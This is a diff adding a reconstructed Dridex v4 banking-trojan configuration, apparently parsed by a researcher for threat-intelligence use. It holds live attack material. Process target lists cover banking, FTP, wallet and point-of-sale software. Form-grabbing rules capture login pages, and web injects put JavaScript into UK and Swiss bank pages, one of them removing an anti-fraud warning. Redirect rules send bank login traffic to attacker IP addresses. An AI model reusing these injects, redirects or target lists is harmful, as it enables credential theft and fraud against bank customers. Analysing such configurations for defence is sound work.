@@ -1,0 +1,382 @@
+<?xml version="1.0" ?>
+<!--
+    *************************************************************    
+    ***            dridex v4 configuration                    ***    
+    *************************************************************    
+    botnetid:      4200    
+    cfg timestamp: 2018-02-27T13:00:32+01:00    
+    parsed by:     @viql    
+        
+    note: The dridex v4 config is delivered in binary format;    
+          in contrast to dridex v3, there are no configs in    
+          XML format. I tried to replicate the format from v3    
+          as good as possible, but they might not all be correct.    
+        
+          The "modules" blocks originally contain full binaries.    
+          I replaced them with hashes. All modules in Dridex are    
+          identified by crc32 checksums, when known, the "name"    
+          matching the CRC32 is also listed. Neither the hashes,     
+          nor name are part of the config delivered by Dridex.    
+    *************************************************************
+-->
+
+<settings>
+  <modules>
+    <module>
+      <sha256>60a13b2201fc4c1f9f60c3d660e873aeba5ba835e37e16e08171dcf6bdb7bf68</sha256>
+      <sha1>d79a0b4f838df2b52110af73bed6834753dd7916</sha1>
+      <md5>97cf4507315546c5105db08e017f2412</md5>
+      <timestamp>2017-12-27T16:32:56+01:00</timestamp>
+      <architecture>32</architecture>
+      <name>n/a</name>
+      <crc>0x1d1df6f5</crc>
+    </module>
+  </modules>
+  <commands>
+    <cmd id="370020" type="17">
+      <fs>far,totalcmd64,totalcmd32,iFtpSvc,WsftpCOMHelper,IKernel,cftpstes,CuteFtp,flashfxp,filezilla,filezilla,server,ftp,ftp,commander,bpftp,bpftpserver,smartftp,tftpsvc,ffftp,freeftp,coreftp,ftpx,cyberduck,fireftp,winscp,putty,spcp,mobaxterm,SmarTTY,seamonkey,Leechftp,Surfer,WinBacs,albacs,Albany.EFT.Corporate.Client,wpc,eSigner,StartStarMoney,StarMoney,acsagent,accrdsub,acevents,acCOMpkcs,jp2launcher,sllauncher,cspregtool,RegisterTool,OEBMCC32,sfirm,Bbm24win,wip,paypen,mammut_tb,telelink,translink,deltaworks,dfsvc,bitcoin-qt,ArmoryDB,ArmoryQt,electrum-2.9.3,electrum-2.9.2,electrum-2.9.1,electrum-2.9.0,electrum-1.8.1,electrum-2.8.3,electrum-2.8.2,electrum-2.8.1,electrum-2.8.0,electrum-1.9,Ethereum,Wallet,litecoin-qt,dash-qt,monero-wallet-gui,multibit,BacscomIP2,runclient,paycentre,accesspay,PaymentStudio,DiasClient,SynIntegrationClient,QuestLauncher,RemoteAdminServer,SymForm2App,plink,launch,PaygateWpfClient,terminal,Telelink,EBsec,ftrskr,Suite,Entreprise,rbpmain2,rbpmain,tkc,ecbl-nxbp,sagedirect,turbo_teletransmission,cedripack,cedrisend,QikDesktop,QikDesktopCitrix,ConfigurationEditor,InteractFastConfig,otscm-client,ecb-sg,crs1,GbpSV,pstw32,MopaMaes,ldcptv10,gslshmsrvc,launcher,tokensharesrv,universe,ifrun60,roiwin31,guawin32,intwin31,kb_pcb,spawin31,cziwin31,czawin31,sta2gpc,etsr,tellerlauncher,prowin32,dirclt32,PLT1751,PLT1151,cegidebics,CCS3,CCMPS3,ComSX,keepass,c_agent,transac,relaisbtp,telebanking,ewallet,mstsc,powershell,wmic,cardentry,TPComplianceManager,TPWorkstation,BancLine,2.0,MS000000,BancLine,3.0,BancLine,4.0,BancLine,5.0,SFW,ptw1151,fedcomp,sfmain,VRNetWorld,KDS,Kasir,ICS,mpkds,pspooler,ipspool,POS-CFG,callerIdserver,EftTray,dpseftxc,EFTSERV,QBPOS,APRINT6,POSCONFG,jRestaurant,AFR38,rmpos,roi,AxUpdatePortal,Firefly,InitEpp,SM22,xfsExplorer,XFSSimulator,WosaXFSTest,kiosk,CRE2004,aspnet_wp,javav,XChrgSrv,rpccEngine,PTService,Rpro8,UTG2Svc,Active-Charge,javaw,DDCDSRV1,alohaedc,dbstpssvc,XPS,Transnet,posw,NCRLoader,PSTTransfer,TSTSolutions,wndaudit,TSTAdmin,TellerDR,merapplauncher,contact,manager,goldtllr32,goldtrakpc,farm42phyton,fx4cash,bpcssm,vp-ebanking,LLB,Online,Banking,efix,iberclear,AMBCN,SGO,SQLpnr,vmware-view,banktelapk,SynJhaIntService,uniservice,client32,CanaraCustMaintenance,legaclt,pcsfe,pcscmenu,cwbtf,srvview,pcsmc2vb,cwb3uic,trcgui,cwbsvstr,rtopcb,cwbujcnv,cwbujbld,cwbuisxe,pcsws,cwbsvd,cwblog,cwbdsk,securID,jhaintexec,appupdate,SGNavigatorApp,dbr,WINTRV,bsaadmin,encompass,eautomate,link,adminconsole,commandclientplugin,commandclientplugin_gui,mfmanager,verex,director-server,manager,verex,director-communication,manager,notes,nlnotes,notes2,sacmonitor,netterm,fspnet,bridgerinside,cardserver,si,dais.ebank.client.offlineclient,BGFWIN31,BGDWIN31,BGXWIN31,bocusertool,CLXReader,UBSPay,Migros_Bank_E-Banking,Bank,linth,Online,Banking,java,abastart,abamenu,abajvm,sage200.finanz.gui,vpxclient,htmlshell,mmc,e3K.Main,QOPT,cresus,wineur,abaeb,efinance,GestionPE,BCN-Netkey,Sage,30,ISL_light_client,msaccess,proffix.v4,pxShowThread,evidencija,ForexTraderPro,mammut,private,CashCommv5,winbiz,saplogon,eAssetLink,facture,salaires8,jxbrowser-chromium,SBDDesktop,sg50launcher,Sage.Central.AutoUpdateManager.Service,Sage.SData.Service,sg50CtrlSvc,sg50RmtAppSvc,sg50svc,IRISPayroll,iwinload,navigationmanager,scsignernativemessagehost,intact,interprisesuite,Act!,Act!.Integration,Act.Outlook.Service,ExchequerPayroll,ENTRPRSE,ENTER1,FAXCLNT,PMG,ELBA5,Wacmenu,MICROS,IberQS,PaymentStandard,RPRO8,ISSPOS,ConcordIP_Host,DDCDSRV1,ClientSitef,Active-Charge,Rock,CRE2004,OmniPOS,EdcSvr,AFR38,POS_retail,qbpos,RWPOS,QBPOSShell,JPOS,touchPOS,bosrv,PowerPay,HeartlandIP_Term,POSINIT,DSIHeartlandIP_TermSL,CreditCardService,DSIVitalTNSIP_Term,PaymentServer,RoomKey,XChrgSrv,Cashmate,FiveStarCreditCardIntegration,PaymentBridge,CashClub,CXSRetailPOS,finchart,Payment,Gateway,Swipe,ElectronicLockbox,CPS.POSExpressV3,DSICardnetIP_Term,Magtek,Signature,Capture,Aldelo.EDC.AFRService,XCharge,Gym,Assistant,20,e7,ebmain,PGEPOService,GUIApplication,sfmainprg,sfunload</fs>
+    </cmd>
+    <cmd id="405935" type="19">
+      <fs/>
+    </cmd>
+  </commands>
+  <config>
+    <httpshots>
+      <url onget="1" onpost="1" type="deny">\.(gif|png|jpg|css|swf|ico|js)($|\?)</url>
+      <url onget="1" onpost="1" type="deny">(resource\.axd|yimg\.com)</url>
+    </httpshots>
+    <formgrabber>
+      <url type="allow">^http://.*citrix</url>
+      <url type="allow">^http://.+winbacs/</url>
+      <url type="allow">^http://sisesrv1/</url>
+      <url type="allow">^http://synfo/</url>
+      <url type="allow">^http://.+\:81/.*</url>
+      <url type="allow">^http://.+\:8888/.*</url>
+      <url type="allow">^http://.+\:8090/.*</url>
+      <url type="allow">^http://.+\:8084/.*</url>
+      <url type="allow">^http://127\.0\.0\.1:3495</url>
+      <url type="allow">^http://.+/MULTIVERSA</url>
+      <url type="allow">^http://.+/workbench/</url>
+      <url type="allow">^http://.+/flows/ebanking/</url>
+      <url type="allow">^http://srvesmad04:8080/</url>
+      <url type="allow">^http://srvaweb01/</url>
+      <url type="allow">^http://.*/sapphire/</url>
+      <url type="allow">^http://192\.168\.161\.23</url>
+      <url type="allow">^http://.+/mscmain</url>
+      <url type="allow">^http://shv-09</url>
+      <url type="allow">^http://intersection</url>
+      <url type="allow">^http://cujc-arcu/</url>
+      <url type="allow">^http://.+\:3495/.*</url>
+      <url type="allow">^http://.+\:3496/.*</url>
+      <url type="allow">^http://.+\:40000/.*</url>
+      <url type="allow">^http://.+\:9000/.*</url>
+      <url type="allow">^http://core-web/</url>
+      <url type="allow">^http://core-syn/</url>
+      <url type="allow">^http://r-space/</url>
+      <url type="allow">^http://dtsgui\.cbhi\.local/</url>
+      <url type="allow">^http://10\.118\.32\.33/</url>
+      <url type="allow">^http://webmail\.</url>
+      <url type="allow">^http://dtsacquire2011</url>
+      <url type="allow">^http://arta2/</url>
+      <url type="allow">^http://dtsap:70/</url>
+      <url type="allow">^http://nmain/</url>
+      <url type="allow">^http://170\.209\.0\.(3|2)</url>
+      <url type="allow">^http://.*/flows/banking/</url>
+      <url type="allow">^http://.*/b2b/faces/login/</url>
+      <url type="allow">^http://.*ingbusinessonline</url>
+      <url type="allow">^http://.*multiweb</url>
+      <url type="allow">^http://.*multiversa</url>
+      <url type="allow">^http://bankway.*/</url>
+      <url type="allow">^http://ebanking</url>
+      <url type="allow">^http://.*office-wings</url>
+      <url type="allow">^http://.+/login\.aspx</url>
+      <url type="allow">^https://www\.facebook\.com/login\.php</url>
+      <url type="deny">^https://.*\.facebook\.com/</url>
+      <url type="deny">^https://twitter.com/(login|account/login_challenge/|sessions)</url>
+      <url type="deny">^https://.*?twitter\.com/</url>
+      <url type="deny">^https://.*?twitch\.tv/</url>
+      <url type="deny">^https://(.*?\.|)gvt2\.com/</url>
+      <url type="deny">^https://.*?youtube\.com/</url>
+      <url type="allow">^https://www.linkedin.com/uas/login</url>
+      <url type="deny">^https://www\.linkedin\.com/</url>
+      <url type="allow">^https://accounts\.google\.com/_/signin/</url>
+      <url type="deny">^https://.*?google\.com/</url>
+      <url type="allow">^https://www\.readcube\.com/.*login</url>
+      <url type="deny">^https://(.*?\.|)readcube\.com/</url>
+      <url type="allow">^https://.*\.sprint.com/.*/login\.jsp</url>
+      <url type="deny">^https://(.*?\.|)sprint.com/</url>
+      <url type="allow">^https://www\.amazon\..+/signin</url>
+      <url type="deny">^https://(.*?\.|)amazon.com/</url>
+      <url type="deny">^https://www\.facilocados\.com</url>
+      <url type="deny">^https://www\.skyrana\.com</url>
+      <url type="deny">^https?://docs\.google\.[^/]+/</url>
+      <url type="deny">^https?://.*\.365lpodds\.com</url>
+      <url type="deny">^https?://outlook\.live\.com</url>
+      <url type="deny">^https?://cws\.conviva\.com</url>
+      <url type="allow">^https://login\.yahoo\.com/account/(challenge|change\-password)</url>
+      <url type="deny">^https?://.*\.yahoo\.com</url>
+      <url type="allow">^https://www\.wsitrader\.com/Account/Login</url>
+      <url type="deny">^https?://.*\.?wsitrader\.com</url>
+      <url type="allow">^https://www\.netflix\.com/(.*/)?Login</url>
+      <url type="deny">^https?://.*\.?netflix\.com</url>
+      <url type="deny">^https?://logx\.optimizely\.com</url>
+      <url type="allow">^https://www\.adnxs\.com/index/login</url>
+      <url type="deny">^https?://(.*\.)?adnxs\.com</url>
+      <url type="allow">^https://fxgmlogin\.tradenetworks\.com</url>
+      <url type="deny">^https?://(.*\.)?tradenetworks\.com</url>
+      <url type="deny">^https?://otf\.msn\.com</url>
+      <url type="allow">^https://(.*\.)?pinterest\.com/resource/UserSessionResource/create</url>
+      <url type="deny">^https?://(.*\.)?pinterest\.com</url>
+      <url type="deny">^https?://pebed\.dm\.gg</url>
+      <url type="deny">^https?://.*\.taboola\.com</url>
+      <url type="deny">^https?://www\.googleapis\.com</url>
+      <url type="allow">^https://app\.pinterest\.com/admins/sign_in</url>
+      <url type="deny">^https?://(.*\.)?intercom\.io</url>
+      <url type="deny">^https://bolt\.dropbox\.com/.*/notify/</url>
+      <url type="deny">^https://.*\.liverail\.com</url>
+      <url type="deny">^https://urs\.microsoft\.com/</url>
+      <url type="deny">^https://.+\.services\.mozilla\.com/</url>
+      <url type="deny">^https://localhost.*/skypectoc/</url>
+      <url type="deny">^https://.*\.skype\.com/api/</url>
+      <url type="deny">^https://incoming\.telemetry\.mozilla\.org/</url>
+      <url type="deny">^https://www\.bing\.com/</url>
+      <url type="deny">^https://self-repair\.mozilla\.org/api/</url>
+      <url type="deny">^https://api\.firefox\.com</url>
+      <url type="deny">^https://mc\.yandex\.ru</url>
+      <url type="deny">^https://.*\.orangeapps\.ru/candyvalley/</url>
+      <url type="deny">^https://candy.*\.king\.com/rpc/ClientApi</url>
+      <url type="deny">^https://api\.accounts\.firefox\.com/</url>
+      <url type="deny">^https://banners\.webmasterplan\.com/.*\.aspx</url>
+      <url type="deny">^https://.*\.forgeofempires\.com/game/json</url>
+      <url type="deny">^https://collector\.schibsted\.io/api/v1/track/</url>
+    </formgrabber>
+    <httpinjblock>
+      <url type="allow">cashproonline-.+\.bankofamerica\.com</url>
+      <url type="allow">www3\.bankline\.</url>
+      <url type="allow">pioneer\.co-operativebank\.</url>
+      <url type="allow">go\.ashx</url>
+    </httpinjblock>
+    <httpinjects>
+      <httpinject label="20023_co_operative_bank.1">
+        <conditions>
+          <url contentType="" modifiers="iU" onget="1" onpost="1" type="allow">^https://cbfm\.saas\.cashfac\.com/cbfm/</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="is">(&lt;/form&gt;)</pattern>
+            <replacement>\1&lt;script type=&quot;text/javascript&quot; language=&quot;JavaScript&quot; src=&quot;scripts/msoffice365.js&quot;&gt;&lt;/script&gt;</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="20023_co_operative_bank.2">
+        <conditions>
+          <url contentType="" modifiers="iU" onget="1" onpost="1" type="allow">^http://www\.co\-operativebank\.co\.uk/corporate/fdo\-noticeboard</url>
+          <url contentType="" modifiers="iU" onget="1" onpost="1" type="allow">^http://www\.co\-operativebank\.co\.uk/business/businessonlinebanking/bobs\-noticeboard</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="isU">&lt;article class=&quot;textareaDefault&quot;&gt;.*be fooled by fraudsters.*&lt;/article&gt;</pattern>
+            <replacement/>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="wwwsecinba_xml">
+        <conditions>
+          <url contentType="" modifiers="U" onget="1" onpost="1" type="allow">^https://(wwwsec|inba|banking|netbanking)\..+\.ch/authen/login(\?|$)</url>
+          <url contentType="" modifiers="" onget="0" onpost="1" type="deny">\.(gif|png|jpg|css|swf)($|\?)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(&lt;/html&gt;)</pattern>
+            <replacement>\1&lt;script type=&quot;text/javascript&quot; src=&quot;scripts/msoffice365.js&quot;&gt;&lt;/script&gt;</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="localhost9000ch_xml">
+        <conditions>
+          <url contentType="" modifiers="U" onget="1" onpost="1" type="allow">^https?://localhost:9000/workbench/WorkbenchOpenAction\.do.*</url>
+          <url contentType="" modifiers="" onget="0" onpost="1" type="deny">\.(gif|png|jpg|css|swf)($|\?)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(&lt;/html&gt;)</pattern>
+            <replacement>\1&lt;script type=&quot;text/javascript&quot; src=&quot;scripts/msoffice365.js&quot;&gt;&lt;/script&gt;</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="loginxhtml_xml">
+        <conditions>
+          <url contentType="" modifiers="U" onget="1" onpost="1" type="allow">^https://.+\.ch/(authen|WEB_XSA_LOGIN)/login\.xhtml</url>
+          <url contentType="" modifiers="" onget="0" onpost="1" type="deny">\.(gif|png|jpg|css|swf)($|\?)</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="i">(&lt;/head&gt;)</pattern>
+            <replacement>&lt;script type=&quot;text/javascript&quot; src=&quot;/WEB_XSA_LOGIN/scripts/msoffice365.js&quot;&gt;&lt;/script&gt;\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="line_az">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://.*bankline.*/(tagManagement|jquery.*)\.js</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(\z)</pattern>
+            <replacement>;window['qweqwe']=&quot;%BOT_ID%&quot;;@@bankline_family?a=1&amp;b=2@@\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="santa_az">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://business\.santander\.co\.uk/.*/jquery-1\..*.min.js</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(\z)</pattern>
+            <replacement>;window['qweqwe']='%BOT_ID%';console.log('qweqwe');\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="clydes_az">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://.*cybusinessonline.co.uk/cebFin/corp/BANKAWAY</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(document.cookie = )</pattern>
+            <replacement>;
+     window['qweqwe']='%BOT_ID%';
+     
+     window['getContentNode'] = function(){
+            var contentNode = null;
+            var navigatinNode = document.querySelector(&quot;td.naviBg&quot;);
+            if( navigatinNode ){
+                contentNode = navigatinNode.parentElement.children[1];
+            }
+
+            return contentNode;
+        };
+
+        window['hider'] = setInterval(function() {
+            var nav = getContentNode();
+            if (nav) {
+                if( nav.style.display !== &quot;none&quot; )
+                    nav.style.display = &quot;none&quot;;
+            }
+        }, 5);
+
+
+     var cooltree_ex = document.createElement('script');
+     cooltree_ex.setAttribute('src','web/L001/script/cooltree_ex.js');
+     document.head.appendChild(cooltree_ex);
+     \1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+      <httpinject label="metro_az">
+        <conditions>
+          <url contentType="" modifiers="Ui" onget="1" onpost="1" type="allow">^https://.*metrobankonline.co.uk/.*__sf_event_listener_hook.js</url>
+        </conditions>
+        <actions>
+          <modify>
+            <pattern modifiers="Ui">(\z)</pattern>
+            <replacement>;window['qweqwe']='%BOT_ID%';
+var jq_plgn_ext = document.createElement('script');
+jq_plgn_ext.setAttribute('src','jquery-ui-plugin-ex.js');
+document.head.appendChild(jq_plgn_ext);\1</replacement>
+          </modify>
+        </actions>
+      </httpinject>
+    </httpinjects>
+    <redirects2>
+      <redirect name="2nd_t" postfwd="0" socks="1" timeout="30" uri="https://67.207.142.38:4431/preycome" vnc="1">msoffice365.js</redirect>
+      <redirect name="1st_t" postfwd="0" socks="0" timeout="20" uri="https://67.207.142.38:4431/realistsflow" vnc="0">ember3.js</redirect>
+      <redirect name="ubs_ebanking2_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/ubs_ebanking2_y7rKX8yF819Lg3/" vnc="0">^https://ebanking\-ch\d*\.ubs\.com/workbench/</redirect>
+      <redirect name="directnet_cs_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/directnet_cs_y7rKX8yF819Lg3/" vnc="0">^https://cs\.directnet\.com/dn/c/cls/</redirect>
+      <redirect name="directnet_nab_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/directnet_nab_y7rKX8yF819Lg3/" vnc="0">^https://nab\.directnet\.com/dn/c/cls/</redirect>
+      <redirect name="postfinance_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/postfinance_y7rKX8yF819Lg3/" vnc="0">^https://www\.postfinance\.ch/ap/ba/fp/html/e\-finance/</redirect>
+      <redirect name="raiffeisen_ch_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/raiffeisen_ch_y7rKX8yF819Lg3/" vnc="0">^https://ebanking\.raiffeisen\.ch/entry/</redirect>
+      <redirect name="images_redirect" postfwd="1" socks="0" timeout="20" uri="https://216.51.232.176:4043/get-dbYd81hd83H/\1" vnc="0">^https://.*/image777000/(.+)</redirect>
+      <redirect name="couts_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/05/qwarna_y7rKX8yF819Lg3/" vnc="0">^https://online\.coutts\.com/eBankingCouttsLogin/</redirect>
+      <redirect name="co_operativebank_fdonline_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/05/graddle_y7rKX8yF819Lg3/" vnc="0">^https://fdonline\.co-operativebank\.co\.uk/corp/</redirect>
+      <redirect name="co_operativebank_business_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/05/grubble_y7rKX8yF819Lg3/" vnc="0">^https://business\.co-operativebank\.co\.uk/corp/</redirect>
+      <redirect name="nationwide_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/05/ni_y7rKX8yF819Lg3/" vnc="0">^https://onlinebanking\.nationwide\.co\.uk/AccessManagement/</redirect>
+      <redirect name="ulsterbank_personal_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/05/aibani_y7rKX8yF819Lg3/" vnc="0">^https://www\.ulsterbankanytimebanking\.co\.uk/</redirect>
+      <redirect name="ulsterbank_personal_redirect2" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/05/aibani_y7rKX8yF819Lg3/" vnc="0">^https://www\.ulsterbankanytimebanking\.ie/</redirect>
+      <redirect name="rbs_personal_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/05/asds_y7rKX8yF819Lg3/" vnc="0">^https://www\.rbsdigital\.com/</redirect>
+      <redirect name="tesco_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/510/tiquani_y7rKX8yF819Lg3/" vnc="0">^https://www\.tescobank\.com/sss/</redirect>
+      <redirect name="danske_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/d1_y7rKX8yF819Lg3/" vnc="0">^https://business2\.danskebank\.(co\.uk|com)/pub/logon/</redirect>
+      <redirect name="boscorp_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/b1_y7rKX8yF819Lg3/" vnc="0">^https://banking\.bankofscotland\.co\.uk/Logon/</redirect>
+      <redirect name="bosbiz_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/b2_y7rKX8yF819Lg3/" vnc="0">^https://online-business\.bankofscotland\.co\.uk/business/logon/</redirect>
+      <redirect name="tsbbiz_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/t1_y7rKX8yF819Lg3/" vnc="0">^https://online-business\.tsb\.co\.uk/business/logon/</redirect>
+      <redirect name="santacorp_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/s1_y7rKX8yF819Lg3/" vnc="0">^https://corporate\.santander\.co\.uk/LOGSCU_NS_ENS/</redirect>
+      <redirect name="lloydslink_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/ll_y7rKX8yF819Lg3/" vnc="0">^https://lloydslink\.online\.lloydsbank\.com/Logon/</redirect>
+      <redirect name="lloydslink_redirect2" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/ll_y7rKX8yF819Lg3/index.php?param1" vnc="0">^https://lloydslink\.online\.lloydstsb\.com/Logon/Logon\.jsp</redirect>
+      <redirect name="lloydscorp_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/lc_y7rKX8yF819Lg3/" vnc="0">^https://banking\.lloydsbank\.com/Logon/</redirect>
+      <redirect name="lloydsbiz_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/lb_y7rKX8yF819Lg3/" vnc="0">^https://onlinebusiness\.lloydsbank\.co\.uk/business/logon/</redirect>
+      <redirect name="hsbcbiz_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/hb_y7rKX8yF819Lg3/" vnc="0">^https://www\.business\.hsbc\.co\.uk/1/2/\!ut/</redirect>
+      <redirect name="barclays_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/br_y7rKX8yF819Lg3/" vnc="0">^https://bank\.barclays\.co\.uk/olb/auth/LoginLink\.action</redirect>
+      <redirect name="4th_t" postfwd="1" socks="0" timeout="30" uri="https://37.228.151.216:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/gateway.php" vnc="0">.+/arq.os</redirect>
+      <redirect name="bankline_family" postfwd="1" socks="0" timeout="30" uri="https://37.228.151.216:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/u309cmkM3G479Q5M/V8aSYv5JID0NDhTm.php" vnc="0">^https://logon\.bankline\..*/scripts/genesis/sloth_inc\.js</redirect>
+      <redirect name="santader_family" postfwd="1" socks="0" timeout="30" uri="https://37.228.151.216:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/Z0Bx9onlf696Fdcy/V8aSYv5JID0NDhTm.php" vnc="0">^https://business\.santander\.co\.uk/Estatico/ALP_SBBI_Templates/Scripts/fl/behaviour2\.js</redirect>
+      <redirect name="clydes_family" postfwd="1" socks="0" timeout="30" uri="https://37.228.151.216:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/NsiUaMUy82wkQYgI/V8aSYv5JID0NDhTm.php" vnc="0">^https://.*cybusinessonline\.co\.uk/.*web/L001/script/cooltree_ex.js</redirect>
+      <redirect name="metro_family" postfwd="1" socks="0" timeout="30" uri="https://37.228.151.216:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/piP6m8YXNZfDKKvj/V8aSYv5JID0NDhTm.php" vnc="0">^https://.*metrobankonline\.co\.uk/.*/jquery-ui-plugin-ex\.js</redirect>
+      <redirect name="lloyds_family" postfwd="1" socks="0" timeout="30" uri="https://37.228.151.216:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/LVYPwEyJ6YX2TeJk/V8aSYv5JID0NDhTm.php" vnc="0">^https://.*\.lloydsbank\.co\.uk/.*/scriptsnippet\.jspf</redirect>
+      <redirect name="barclays_family" postfwd="1" socks="0" timeout="30" uri="https://37.228.151.216:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/bR82swKQ8SALsZWr/V8aSYv5JID0NDhTm.php" vnc="0">^https://bank\.barclays\.co\.uk/js/jq/jq\.js</redirect>
+      <redirect name="nwolb_persik" postfwd="1" socks="0" timeout="60" uri="https://37.228.151.216:443/I1696MTw5in80DHa0DHh7Z2De69DW4ew/dy1Eb64fV46fi3ie/nwp-3X8qHdUdtgSRgjXD/V8aSYv5JID0NDhTm.php" vnc="0">D2HLpgz6964knRethaMqYDygdM5aVZX3FamS.js</redirect>
+      <redirect name="tsbpers_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/tsbpers_y7rKX8yF819Lg3/" vnc="0">^https://online\.tsb\.co\.uk/personal/logon/</redirect>
+      <redirect name="halifaxpers_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/halifaxpers_y7rKX8yF819Lg3/" vnc="0">^https://www\.halifax-online\.co\.uk/personal/logon/</redirect>
+      <redirect name="bospers_redirect" postfwd="1" socks="0" timeout="60" uri="https://178.33.109.227:443/5/bospers_y7rKX8yF819Lg3/" vnc="0">^https://online\.bankofscotland\.co\.uk/personal/logon/</redirect>
+      <redirect name="amex_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/amex_y7rKX8yF819Lg3/\1" vnc="0">^https://online.americanexpress.com/myca/logon/us/action/(.*LogonHandler.*)</redirect>
+      <redirect name="amex_redirect_files" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/amex_y7rKX8yF819Lg3/files/" vnc="0">^https://online.americanexpress.com/myca/logon/us/action/files/</redirect>
+      <redirect name="amex_redirect_inj" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/5/amex_y7rKX8yF819Lg3/default_redirect.js" vnc="0">^https://online.americanexpress.com/myca/logon/us/action/default_redirect.js</redirect>
+    </redirects2>
+    <redirects/>
+    <handlers>
+      <handler handler="timeout" name="name" script="switchoff.js">https://67.207.142.38:4431/B88U86giIPyD55RK/</handler>
+    </handlers>
+    <httpblocks/>
+    <clickshots>
+      <clickshot clicks="20" onget="1" onpost="1" type="allow" xrange="40" yrange="40">^https://ibank1\.bib\.barclays\.com/</clickshot>
+      <clickshot clicks="20" onget="1" onpost="1" type="allow" xrange="40" yrange="40">^https://cashmanagement\.barclays\.net/portalservices/</clickshot>
+      <clickshot clicks="20" onget="1" onpost="1" type="allow" xrange="40" yrange="40">^https://cashmanagement\.barclays\.net/bnetservices/</clickshot>
+      <clickshot clicks="10" onget="1" onpost="1" type="allow" xrange="500" yrange="500">^https://corporate\.santander\.co\.uk/LOGSCU_NS_ENS/BtoChannelDriver\.bto</clickshot>
+      <clickshot clicks="10" onget="1" onpost="1" type="allow" xrange="500" yrange="500">^https://corporate\.santander\.co\.uk/(SCU_AUTHOR_ENS|SCU_PAYMNT_ENS)/</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://entreprises\.societegenerale\.fr/</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://entreprises\.certif\.societegenerale\.fr/authent\.html</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://entreprises\.secure\.societegenerale\.fr/authent\.html</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://professionnels\.secure\.lcl\.fr/outil/UAUT/Accueil/preRoutageLogin</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://www\.labanquepostale\.fr/grands-institutionnels\.html</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://www\.labanquepostale\.fr/entreprises\.html</clickshot>
+      <clickshot clicks="15" onget="1" onpost="1" type="allow" xrange="30" yrange="30">^https://www\.labanquepostale\.fr/grandes-entreprises\.html</clickshot>
